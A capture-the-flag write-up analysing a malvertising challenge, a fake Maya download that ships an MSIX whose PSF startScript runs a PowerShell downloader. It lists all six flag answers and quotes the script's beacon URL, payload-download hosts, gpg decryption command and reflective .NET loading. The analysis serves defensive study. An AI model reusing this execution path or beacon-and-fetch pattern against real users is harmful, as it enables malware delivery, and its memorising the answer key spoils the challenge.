# MalAd — malware forensics, easy — 6 flags, 1000 pts

**All six sub-flags:**

| Question | Answer |
|---|---|
| Archive password | `p@ssw0rd1337` |
| Next-stage download domain | `alexpshy.htb` |
| Beacon / check-in domain | `cornbasc.htb` |
| Malicious script | `new2000.ps1` |
| Config file that executes it | `config.json` |
| Malware file | `Maya_2024-x64.msix` |

A malvertising scenario: a fake Autodesk "Download Maya" page. No file handout — everything comes
from the live instance.

---

## Step 1 — the site is a Vite dev server

The landing page is a React SPA. Critically it is served by **`vite dev`, not a production build**,
which means the raw TypeScript sources are fetchable:

```console
$ curl -s http://$HOST:$PORT/src/App.tsx
```

That reveals the download path without any clicking or fuzzing:

```
download/Maya_2024-x64.msix
```

*(Generalisable: whenever a challenge front end is a dev server, start at `/src/main.tsx` and follow
the import graph. It is faster and more complete than scraping rendered HTML.)*

## Step 2 — unpack the MSIX

An `.msix` is a zip. 35 MB.

```console
$ unzip Maya_2024-x64.msix -d msix/
```

Inside is **`config.json`** — a **Package Support Framework (PSF)** configuration:

```json
{ "applications": [{
    "id": "CreateInstallerMAYAEnglishWIN64.exe",
    "startScript": { "scriptPath": "new2000.ps1", ... }
}]}
```

PSF is a legitimate Microsoft compatibility shim for repackaged MSIX apps, and its `startScript`
feature runs an arbitrary PowerShell script at launch. Abusing it is a real-world technique — the
same one used in the FakeBat / Maya MSIX malvertising campaigns this challenge is modelled on.

## Step 3 — read the script

`new2000.ps1`:

```powershell
$LoadDomen = "http://cornbasc.htb"
$MetaLnk   = "http://alexpshy.htb/1.jpg"
```

- **AV enumeration** via WMI `root\SecurityCenter2`.
- **Beacon** to `http://cornbasc.htb/?status=start&av=<AV list>` and later `?status=install`.
- **Download** `http://alexpshy.htb/2.tar.gpg`.
- **Decrypt** it:
  ```powershell
  echo 'p@ssw0rd1337' | gpg.exe --batch --passphrase-fd 0 --decrypt
  ```
- **Extract** the tar and run `%APPDATA%\<random>\hvn\VBoxSVC.exe` — a legitimate-looking filename
  for the implant.
- **Reflectively load** `http://alexpshy.htb/1.jpg` as a .NET assembly (a PE with a `.jpg` extension).

## Step 4 — answer precisely

The questions separate two domains that are easy to conflate:

- **`cornbasc.htb`** is *only* contacted for status beacons (`?status=start`, `?status=install`).
- **`alexpshy.htb`** is where payloads (`1.jpg`, `2.tar.gpg`) are fetched from.

The question asking for the download domain "in alphabetical order" hints there could be several;
here it resolves to `alexpshy.htb`.

---

## Chain summary

```
malvertised "Download Maya" page (Vite dev server, /src/App.tsx leaks the link)
  └── Maya_2024-x64.msix           (MSIX = zip)
        └── config.json            (PSF startScript)
              └── new2000.ps1
                    ├── beacon   -> cornbasc.htb/?status=start&av=…
                    ├── download -> alexpshy.htb/2.tar.gpg  (gpg, 'p@ssw0rd1337')
                    │                 └── %APPDATA%\<rand>\hvn\VBoxSVC.exe
                    └── reflective load -> alexpshy.htb/1.jpg  (.NET assembly)
```

---

## Lessons

- **MSIX + PSF `startScript` is a signed-installer execution path.** Defenders should treat
  `config.json` inside an MSIX as executable content and alert on `startScript` in unsigned or
  sideloaded packages.
- A development server in production leaks your entire source tree. Check for `/src/`, `/@vite/`,
  and source maps before fuzzing.
- **Separate "where it calls home" from "where it gets code".** Real campaigns split these across
  hosts precisely so that blocking one does not stop the other — and challenge questions test whether
  you noticed.
- A passphrase piped to `gpg --passphrase-fd 0` sits in the script in plaintext. Scripted decryption
  is self-documenting for the analyst.
